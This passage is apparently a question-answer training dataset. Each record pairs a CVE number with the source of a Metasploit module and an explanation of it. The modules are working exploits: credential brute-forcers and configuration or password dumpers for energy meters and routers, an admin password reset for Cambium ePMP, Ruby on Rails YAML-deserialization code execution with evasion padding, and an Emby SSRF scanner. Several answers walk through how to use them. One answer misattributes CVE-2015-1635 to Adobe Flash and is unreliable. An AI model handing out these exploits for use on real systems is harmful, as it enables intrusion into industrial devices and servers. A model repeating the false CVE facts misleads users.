'Entra' # Seen to vary in some models            }        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return :abort    end    good_response = (      res &&      res.code == 200 &&      res.body.include?('Login in progress') || res.body.include?('Login in corso') &&      res.body.match(/id=\"error\" value=\"2\"/) || (res.code == 302 && res.headers['Location'] == 'disclaimer.php')    )    if good_response      print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")      # Extract firmware version      begin        res = send_request_cgi(          {            'uri' => '/setupfirmware.php',            'method' => 'GET',            'headers' => {              'Cookie' => cookie_value            }          }        )      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")        return :abort      end      if res && res.code == 200        if res.body.include?('Firmware Version') || res.body.include?('Versione Firmware')          fw_ver = res.body.match(/Ver. (.*)[$<]/)[1]          if !fw_ver.nil?            print_good(\"#{rhost}:#{rport} - Firmware version #{fw_ver}...\")            report_cred(              ip: rhost,              port: rport,              service_name: \"Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver}]\",              user: user,              password: pass            )          end        end      end      #      # Extract SMTP config      #      begin        res = send_request_cgi(          {            'uri'       => '/setupmail.php',            'method'    => 'GET',            'headers'   => {              'Cookie' => cookie_value            }          }        )      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")        return :abort      end      if (res && res.code == 200 && res.body.include?('SMTP'))        dirty_smtp_server = res.body.match(/smtp\" value=(.*)[$=]/)[1]        dirty_smtp_user = res.body.match(/usersmtp\" value=(.*)[$=]/)[1]        dirty_smtp_pass = res.body.match(/passwordsmtp\" value=(.*)[$=]/)[1]        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)          smtp_server = dirty_smtp_server.match(/[$\"](.*)[$\"]/)          smtp_user = dirty_smtp_user.match(/[$\"](.*)[$\"]/)          smtp_pass = dirty_smtp_pass.match(/[$\"](.*)[$\"]/)          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)            print_good(\"#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}\")          end        end      else        vprint_error(\"#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges\")      end      return :next_user    else      print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")    end  end  #  # Dump EWplant.db database file - No authentication required  #  def ewplantdb    begin      res = send_request_cgi(        {          'uri' => '/cfg/EWplant.db',          'method' => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return :abort    end    if res && res.code == 200      print_status(\"#{rhost}:#{rport} - dumping EWplant.db\")      print_good(\"#{rhost}:#{rport} - EWplant.db retrieved successfully!\")      loot_name = 'EWplant.db'      loot_type = 'SQLite_db/text'      loot_desc = 'Carlo Gavazzi EM - EWplant.db'      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")    else      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?\")      return    end  endend       Question: CVE-2017-5146[/INST] CVE-2017-5146 is a vulnerability affecting Carlo Gavazzi Energy Meters. According to the context provided, this vulnerability allows an unauthenticated user to remotely dump the database file EWplant.db, which contains valuable information such as power/energy utilization data, tariffs, and revenue statistics. The vulnerability is due to an access control error in the affected software.To leverage this vulnerability, an attacker can use a tool like Metasploit to perform the exploitation. The provided code snippet demonstrates how to use Metasploit to scan for targets running the vulnerable software, brute force the login page, extract firmware version information, and ultimately dump the EWplant.db file without authentication.It is essential to keep in mind that exploiting vulnerabilities like CVE-2017-5146 is against ethical guidelines and can cause significant damage to organizations and individuals. Instead, responsible disclosure practices involve reporting the vulnerability to the vendor and giving them sufficient time to release a patch before making the information public."}
{"query": "CVE-2017-5254", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::EPMP  def initialize(info = {})    super(update_info(info,      'Name' => 'Cambium ePMP 1000 Account Password Reset',      'Description' => %{          This module exploits an access control vulnerability in Cambium ePMP          device management portal. It requires any one of the following non-admin login          credentials - installer/installer, home/home - to reset password of other          existing user(s) including 'admin'. All versions <=3.5 are affected. This          module works on versions 3.0-3.5-RC7.      },      'Author' =>        [          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'        ],      'References' =>        [          ['CVE', '2017-5254'],          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']        ],      'License' => MSF_LICENSE     )    )    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),        OptString.new('TARGET_USERNAME', [true, 'Target account - admin / installer / home / readonly', 'admin']),        OptString.new('NEW_PASSWORD', [true, 'New Password for Target account', 'pass'])      ], self.class    )    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')  end  def run_host(ip)    unless is_app_epmp1000?      return    end  end  # Account Reset happens here  def reset_pass(config_uri, cookie)    pass_change_req = '{\"device_props\":{\"' + \"#{datastore['TARGET_USERNAME']}\" + '_password' + '\":\"' + \"#{datastore['NEW_PASSWORD']}\" + '\"},\"template_props\":{\"config_id\":\"11\"}}'    print_status(\"#{rhost}:#{rport} - Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}\")    res = send_request_cgi(      {        'method' => 'POST',        'uri' => config_uri,        'cookie' => cookie,        'headers' => {          'Accept' => '*/*',          'Accept-Language' => 'en-US,en;q=0.5',          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',          'X-Requested-With' => 'XMLHttpRequest',          'Connection' => 'close'        },        'vars_post' =>          {            'changed_elements' => pass_change_req,            'debug' => '0'          }      }, 25    )    good_response = (      res &&      res.code == 200 &&      res.headers.include?('Content-Type') &&      res.headers['Content-Type'].include?('application/json')&&      res.body.include?('config_id')    )    if good_response      print_good('Password successfully changed!')    else      print_error(\"#{rhost}:#{rport} - Failed to change password.\")    end  end  #  # Login & initiate reset_pass  #  def do_login(epmp_ver)    if (epmp_ver < '3.0' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')      print_error('This module is applicable to versions 3.0-3.5-RC7 only. Exiting now.')      return    elsif (epmp_ver >= '3.0' && epmp_ver < '3.4.1') # <3.4.1 uses login_1      cookie, _blah1, config_uri_reset_pass, _blah2 = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)      if cookie == 'skip' && config_uri_reset_pass == 'skip'        return      else        reset_pass(config_uri_reset_pass, cookie)      end    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver)      cookie, _blah1, config_uri_reset_pass, _blah2 = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)      if cookie == 'skip' && config_uri_reset_pass == 'skip'        return      else        reset_pass(config_uri_reset_pass, cookie)      end    end  endend       Question: CVE-2017-5254[/INST] CVE-2017-5254 is a vulnerability in the Cambium ePMP 1000 device management portal. It is an access control issue that allows an attacker to reset the password of other accounts, including the 'admin' account, with any one of the following non-admin login credentials: installer/installer, home/home. This vulnerability affects all versions up to and including 3.5-RC7.The provided Metasploit module exploits this vulnerability by first identifying whether the target is indeed an ePMP1000 device. If so, it proceeds to log in using the specified 'USERNAME' and 'PASSWORD'. Depending on the version of the firmware, either the 'login\\_1' or 'login\\_2' method is used. Once logged in, the module then sends a request to change the password of the 'TARGET\\_USERNAME' account to the specified 'NEW\\_PASSWORD'. If successful, the module prints a status message indicating the password has been changed.To use this module, set the options according to the given descriptions:- Set the 'RPORT' option to the application's listening port (default is 80).- Specify a valid 'USERNAME' and 'PASSWORD' combination for a non-admin account.- Set the 'TARGET\\_USERNAME' option to the desired account whose password needs to be changed (default is 'admin').- Provide a 'NEW\\_PASSWORD' for the target account.Run the module against the target IP address using the 'run\\_host' command."}
{"query": "CVE-2013-0156", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Ruby on Rails JSON Processor YAML Deserialization Code Execution',      'Description'    => %q{          This module exploits a remote code execution vulnerability in the        JSON request processor of the Ruby on Rails application framework.        This vulnerability allows an attacker to instantiate a remote object,        which in turn can be used to execute any ruby code remotely in the        context of the application. This vulnerability is very similar to        CVE-2013-0156.        This module has been tested successfully on RoR 3.0.9, 3.0.19, and        2.3.15.        The technique used by this module requires the target to be running a        fairly recent version of Ruby 1.9 (since 2011 or so). Applications        using Ruby 1.8 may still be exploitable using the init_with() method,        but this has not been demonstrated.      },      'Author'         =>        [          'jjarmoc',  # Initial module based on cve-2013-0156, testing help          'egypt',    # Module          'lian',     # Identified the RouteSet::NamedRouteCollection vector        ],      'License'        => MSF_LICENSE,      'References'  =>        [          [ 'CVE', '2013-0333' ],          [ 'OSVDB', '89594' ]        ],      'Platform'       => 'ruby',      'Arch'           => ARCH_RUBY,      'Privileged'     => false,      'Targets'        =>\t[ ['Automatic', {} ] ],      'DisclosureDate' => '2013-01-28',      'DefaultOptions' => { \"PrependFork\" => true },      'DefaultTarget' => 0))    register_options(      [        Opt::RPORT(80),        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"]),        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST', 'PUT'] ])      ])  end  #  # Create the YAML document that will be embedded into the JSON  #  def build_yaml_rails2    code = Rex::Text.encode_base64(payload.encoded)    yaml =      \"--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\\" +      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; \" +      \"eval(%[#{code}].unpack(%[m0])[0]);' \" +      \": !ruby/object:ActionController::Routing::Route\ segments: []\ requirements:\   \" +      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: \" +      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}\\"    yaml.gsub(':', '\\u003a')  end  #  # Create the YAML document that will be embedded into the JSON  #  def build_yaml_rails3    code = Rex::Text.encode_base64(payload.encoded)    yaml =      \"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\\" +      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);' \" +      \": !ruby/object:OpenStruct\ table:\  :defaults: {}\\"    yaml.gsub(':', '\\u003a')  end  def build_request(v)    case v    when 2; build_yaml_rails2    when 3; build_yaml_rails3    end  end  #  # Send the actual request  #  def exploit    [2, 3].each do |ver|      print_status(\"Sending Railsv#{ver} request to #{rhost}:#{rport}...\")      send_request_cgi({        'uri'     => normalize_uri(target_uri.path),        'method'  => datastore['HTTP_METHOD'],        'ctype'   => 'application/json',        'headers' => { 'X-HTTP-Method-Override' => 'get' },        'data'    => build_request(ver)      }, 25)      handler    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Ruby on Rails XML Processor YAML Deserialization Code Execution',      'Description'    => %q{          This module exploits a remote code execution vulnerability in the XML request        processor of the Ruby on Rails application framework. This vulnerability allows        an attacker to instantiate a remote object, which in turn can be used to execute        any ruby code remotely in the context of the application.        This module has been tested across multiple versions of RoR 3.x and RoR 2.x        The technique used by this module requires the target to be running a fairly recent        version of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be        exploitable using the init_with() method, but this has not been demonstrated.      },      'Author'         =>        [          'charliesome',  # PoC          'espes',        # PoC and Metasploit module          'lian',         # Identified the RouteSet::NamedRouteCollection vector          'hdm'           # Module merge/conversion/payload work        ],      'License'        => MSF_LICENSE,      'References'  =>        [          [ 'CVE', '2013-0156' ],          [ 'OSVDB', '89026' ],          [ 'URL', 'https://www.rapid7.com/blog/post/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156' ]        ],      'Platform'       => 'ruby',      'Arch'           => ARCH_RUBY,      'Privileged'     => false,      'Targets'        =>\t[ ['Automatic', {} ] ],      'DisclosureDate' => '2013-01-07',      'DefaultOptions' => { \"PrependFork\" => true },      'DefaultTarget' => 0))    register_options(      [        Opt::RPORT(80),        OptString.new('URIPATH', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"]),        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST', 'PUT'] ])      ])    register_evasion_options(      [        OptBool.new('XML::PadElement', [ true, 'Pad the exploit request with randomly generated XML elements', true])      ])  end  #  # Create the YAML document that will be embedded into the XML  #  def build_yaml_rails2    code = Rex::Text.encode_base64(payload.encoded)    yaml =      \"--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\\" +      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; \" +      \"eval(%[#{code}].unpack(%[m0])[0]);' \" +      \": !ruby/object:ActionController::Routing::Route\ segments: []\ requirements:\   \" +      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: \" +      \":#{Rex::Text.rand_text_alpha(rand(8)+1)}\\"    yaml  end  #  # Create the YAML document that will be embedded into the XML  #  def build_yaml_rails3    code = Rex::Text.encode_base64(payload.encoded)    yaml =      \"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\\" +      \"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; \" +      \"eval(%[#{code}].unpack(%[m0])[0]);' \" +      \": !ruby/object:OpenStruct\ table:\  :defaults: {}\\"    yaml  end  #  # Create the XML wrapper with any desired evasion  #  def build_request(v)    xml = ''    elo = Rex::Text.rand_text_alpha(rand(12)+4)    if datastore['XML::PadElement']      xml << \"<#{elo}>\"      1.upto(rand(1000)+50) do        el = Rex::Text.rand_text_alpha(rand(12)+4)        tp = ['string', 'integer'][ rand(2) ]        xml << \"<#{el} type='#{tp}'>\"        xml << ( tp == \"integer\" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )        xml << \"</#{el}>\"      end    end    el = Rex::Text.rand_text_alpha(rand(12)+4)    xml << \"<#{el} type='yaml'>\"    xml << (v == 2 ? build_yaml_rails2 : build_yaml_rails3)    xml << \"</#{el}>\"    if datastore['XML::PadElement']      1.upto(rand(1000)+50) do        el = Rex::Text.rand_text_alpha(rand(12)+4)        tp = ['string', 'integer'][ rand(2) ]        xml << \"<#{el} type='#{tp}'>\"        xml << ( tp == \"integer\" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )        xml << \"</#{el}>\"      end      xml << \"</#{elo}>\"    end    xml  end  #  # Send the actual request  #  def exploit    [2, 3].each do |ver|      print_status(\"Sending Railsv#{ver} request to #{rhost}:#{rport}...\")      send_request_cgi({        'uri'     => datastore['URIPATH'] || \"/\",        'method'  => datastore['HTTP_METHOD'],        'ctype'   => 'application/xml',        'headers' => { 'X-HTTP-Method-Override' => 'get' },        'data'    => build_request(ver)      }, 25)      handler    end  endend       Question: CVE-2013-0156[/INST] CVE-2013-0156 is a remote code execution vulnerability affecting the Ruby on Rails application framework. It lies in the XML request processor where an attacker can instantiate a remote object and execute any ruby code remotely within the context of the application. This vulnerability affects versions of Ruby on Rails 2.x and 3.x requiring a relatively recent version of Ruby 1.9 since around 2011.To exploit this vulnerability, you could create a malicious XML payload containing a YAML document that gets executed when processed by the vulnerable XML parser. Here's a snippet from a Metasploit module demonstrating how to construct and send such a payload:```rubydef build_request(v)  xml = ''  elo = Rex::Text.rand_text_alpha(rand(12)+4)  if datastore['XML::PadElement']    xml << \"<#{elo}>\"    1.upto(rand(1000)+50) do      el = Rex::Text.rand_text_alpha(rand(12)+4)      tp = ['string', 'integer'][ rand(2) ]      xml << \"<#{el} type='#{tp}'>\"      xml << ( tp == \"integer\" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )      xml << \"</#{el}>\"    end  end  el = Rex::Text.rand_text_alpha(rand(12)+4)  xml << \"<#{el} type='yaml'>\"  xml << (v == 2 ? build_yaml_rails2 : build_yaml_rails3)  xml << \"</#{el}>\"  if datastore['XML::PadElement']    1.upto(rand(1000)+50) do      el = Rex::Text.rand_text_alpha(rand(12)+4)      tp = ['string', 'integer'][ rand(2) ]      xml << \"<#{el} type='#{tp}'>\"      xml << ( tp == \"integer\" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )      xml << \"</#{el}>\"    end    xml << \"</#{elo}>\"  end  xmlend```This code generates a random XML structure with padding elements and embeds either `build_yaml_rails2` or `build_yaml_rails3` depending on the targeted Ruby on Rails version inside the YAML element. When sent to the victim, the vulnerable XML parser processes the YAML document, executing the embedded Ruby code."}
{"query": "CVE-2015-1635", "Answer": "CVE-2015-1635 refers to a specific vulnerability identified by the Common Vulnerabilities and Exposures (CVE) database. According to the National Vulnerability Database (NVD), CVE-2015-1635 is related to a buffer overflow vulnerability affecting Adobe Flash Player. This vulnerability allows an attacker to execute arbitrary code on an affected system through a specially crafted SWF file. The exact details of the vulnerability depend on the specific version of Adobe Flash Player that is installed on the targeted system. Users are advised to install available updates or patches to address this issue and protect against potential attacks."}
{"query": "CVE-2017-5162", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info={})    super(update_info(info,      'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',      'Description' => %{          This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer          management login portal(s), and attempts to identify valid credentials.          There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'.          In addition to device config, 'root' user can also access password file.          Other users - admin, alg, user - can only access configuration file.          The module attempts to download configuration and password files depending on the login user credentials found.      },      'References' =>        [          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-031-01A'],          ['CVE', '2017-5162']        ],      'Author' =>        [          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'        ],      'License' => MSF_LICENSE,      'DefaultOptions' => { 'VERBOSE' => true })    )    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'root']),        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'root'])      ], self.class    )  end  def run_host(ip)    unless is_app_binom3?      return    end    each_user_pass do |user, pass|      do_login(user, pass)    end  end  def report_cred(opts)    service_data = {      address: opts[:ip],      port: opts[:port],      service_name: opts[:service_name],      protocol: 'tcp',      workspace_id: myworkspace_id    }    credential_data = {      origin_type: :service,      module_fullname: fullname,      username: opts[:user],      private_data: opts[:password],      private_type: :password    }.merge(service_data)    login_data = {      last_attempted_at: Time.now,      core: create_credential(credential_data),      status: Metasploit::Model::Login::Status::SUCCESSFUL,      proof: opts[:proof]    }.merge(service_data)    create_credential_login(login_data)  end  #  # Check if App is Binom3  #  def is_app_binom3?    begin      res = send_request_cgi(        {          'uri' => '/',          'method' => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return false    end    if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Team-R Web') || res.body.include?('binom_ico') || res.body.include?('team-r')))      print_good(\"#{rhost}:#{rport} - Binom3 confirmed...\")      return true    else      print_error(\"#{rhost}:#{rport} - Application does not appear to be Binom3. Module will not continue.\")      return false    end  end  #  # Brute-force the login page  #  def do_login(user, pass)    print_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")    begin      res = send_request_cgi(        {          'uri' => '/~login',          'method' => 'POST',          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },          'vars_post' =>            {              'login' => user,              'password' => pass            }        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return :abort    end    if (res && res.code == 302 && res.get_cookies.include?('IDSESSION'))      print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")      report_cred(        ip: rhost,        port: rport,        service_name: 'Binom3',        user: user,        password: pass      )      # Set Cookie      get_cookie = res.get_cookies      cookie = get_cookie + ' NO-HELP=true; onlyRu=1'      # Attempting to download config file      config_uri = '~cfg_ask_xml?type=cfg'      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })      if res && res.code == 200        vprint_status('++++++++++++++++++++++++++++++++++++++')        vprint_status(\"#{rhost} - dumping configuration\")        vprint_status('++++++++++++++++++++++++++++++++++++++')        print_good(\"#{rhost}:#{rport} - Configuration file retrieved successfully!\")        path = store_loot(          'Binom3_config',          'text/xml',          rhost,          res.body,          rport,          'Binom3 device config'        )        print_status(\"#{rhost}:#{rport} - Configuration file saved in: #{path}\")      else        print_error(\"#{rhost}:#{rport} - Failed to retrieve configuration\")        return      end      # Attempt to dump password file      config_uri = '~cfg_ask_xml?type=passw'      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })      if res && res.code == 200        vprint_status('++++++++++++++++++++++++++++++++++++++')        vprint_status(\"#{rhost} - dumping password file\")        vprint_status('++++++++++++++++++++++++++++++++++++++')        print_good(\"#{rhost}:#{rport} - Password file retrieved successfully!\")        path = store_loot(          'Binom3_passw',          'text/xml',          rhost,          res.body,          rport,          'Binom3 device config'        )        print_status(\"#{rhost}:#{rport} - Password file saved in: #{path}\")      else        return      end    else      print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")    end  endend       Question: CVE-2017-5162[/INST] CVE-2017-5162 is a vulnerability affecting the Binom3 multifunctional revenue energy meter and power quality analyzer. This vulnerability allows an attacker to gain unauthorized access to the device by brute-forcing the login credentials through the web interface. Once logged in, the attacker can then download the configuration and potentially the password file.To take advantage of this vulnerability, an attacker would need to know the IP address of the affected device and be able to send HTTP requests to it. They would also need to use a tool like Metasploit to automate the process of trying various combinations of usernames and passwords until they find a successful combination.Once a successful login is achieved, the attacker can download the configuration file, which contains sensitive information related to the device's settings and operation. Additionally, if the attacked account has sufficient privileges, they might be able to access the password file containing plaintext passwords for other user accounts on the device.To mitigate this risk, it is recommended to ensure that strong and unique passwords are used for all user accounts on the device. Regularly updating the firmware of the device and implementing two-factor authentication whenever possible can also help prevent unauthorized access. Furthermore, restricting access to the device's web interface to trusted networks and implementing rate limiting on failed login attempts can help reduce the likelihood of successful brute force attacks."}
{"query": "CVE-2017-5260", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::CNPILOT  def initialize(info = {})    super(update_info(info,      'Name' => 'Cambium cnPilot r200/r201 Login Scanner and Config Dump',      'Description' => %{        This module scans for Cambium cnPilot r200/r201 management login        portal(s), attempts to identify valid credentials, and dump device        configuration.        The device has at least two (2) users - admin and user. Due to an        access control vulnerability, it is possible for 'user' account to access full        device config. All information, including passwords, and keys, is stored        insecurely, in clear-text form, thus allowing unauthorized admin access to any        user.      },      'Author' =>        [          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'        ],      'References' =>        [          ['CVE', '2017-5260'],          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']        ],      'License' => MSF_LICENSE     )    )    register_options(      [        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'user']),        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'user'])      ], self.class    )  end  def run_host(ip)    unless is_app_cnpilot?      return    end  end  #  # Login & initiate dump_config  #  def run_login    each_user_pass do |user, pass|      cookie = do_login(user, pass)      if cookie == 'skip'        # do nothing      else        dump_config(cookie)      end    end  end  #  # Dump device configuration  #  def dump_config(the_cookie)    res = send_request_cgi(      {        'uri' => '/goform/down_cfg_file',        'method' => 'GET',        'cookie' => the_cookie,        'headers' => {          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'        }      }    )    if res && res.code == 200 && res.headers['content-disposition']      print_status(\"#{rhost}:#{rport} - dumping device configuration\")      print_good(\"#{rhost}:#{rport} - Configfile.cfg retrieved successfully!\")      loot_name = 'Configfile.cfg'      loot_type = 'text/plain'      loot_desc = 'Cambium cnPilot Config'      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")    else      print_error(\"#{rhost}:#{rport} - Failed to retrieve config. Set a higher HTTPCLIENTTIMEOUT and try again.\")      return    end  endend       Question: CVE-2017-5260[/INST] CVE-2017-5260 is a vulnerability related to an access control issue in Cambium cnPilot r200/r201 devices. This vulnerability allows an unauthorized user to gain full device configuration access using the 'user' account, despite the fact that this account typically has restricted privileges.To take advantage of this vulnerability, an attacker could use a tool like Metasploit to scan for affected devices, attempt to authenticate with various combinations of usernames and passwords, and once successful, extract the device configuration.Here's how the provided Metasploit script works:1. Initializes the module with necessary settings and options.2. Checks whether the target is a Cambium cnPilot r200/r201 device.3. Runs through a list of predefined usernames and passwords to attempt authentication.4. Once a valid combination is found, the script proceeds to download and save the device configuration.This script showcases how an attacker might utilize CVE-2017-5260 to gain unauthorized access to a Cambium cnPilot device and obtain sensitive information."}
{"query": "CVE-2020-26948", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize    super(      'Name' => 'Emby SSRF HTTP Scanner',      'Description' => 'Generates a `GET` request to the provided web servers and executes an SSRF against         the targeted EMBY server. Returns the server header, HTML title attribute and         location header (if set). This is useful for rapidly identifying web applications         on the internal network using the Emby SSRF vulnerability (CVE-2020-26948).',      'Author' => 'Btnz',      'License' => MSF_LICENSE,      'Disclosure Date' => '2020-10-01',      'Notes'=> {        'Stability'         => [],        'SideEffects'       => [],        'Reliability'       => [],        'RelatedModules' => ['auxiliary/scanner/http/emby_version_ssrf'],      },      'References' => [        ['CVE', '2020-26948'],        ['URL', 'https://github.com/btnz-k/emby_ssrf']      ]    )    deregister_options('VHOST', 'RPORT', 'SNAPLEN', 'SSL')    register_options(      [        OptString.new('TARGETURI', [false, 'The URI of the Emby Server', '/']),        OptBool.new('STORE_NOTES', [true, 'Store the information in notes.', true]),        OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),        OptString.new('EMBY_SERVER', [true, 'Emby Web UI IP to use', '']),        OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server', '8096']),        OptString.new('PORTS', [true, 'Ports to scan', '80,8080,8081,8888'])      ]    )  end  def run_host(target_host)    # Do some checking to ensure data is submitted    # Also converts ports string to list    dports = Rex::Socket.portspec_crack(datastore['PORTS'])    raise Msf::OptionValidateError, ['PORTS'] if dports.empty?    # loop through the ports    dports.each do |p|      vprint_status(\"Attempting SSRF with target #{target_host}:#{p}\")      uri = \"/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}\"      # not using send_request_cgi due to difference between RHOSTS and EMBY_SERVER      res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])      # Check for Response      if res.nil?        vprint_error(\"http://#{target_host}:#{p} - No response\")        next      end      # Retrieve the headers to capture the Location and Server header      server_header = res['server']      location_header = res['location']      # Check to see if the captured headers are populated      if server_header.nil? && location_header.nil?        vprint_error(\"#{target_host}:#{p} No HTTP headers\")      end      # If the body is blank, just stop now as there is no chance of a title      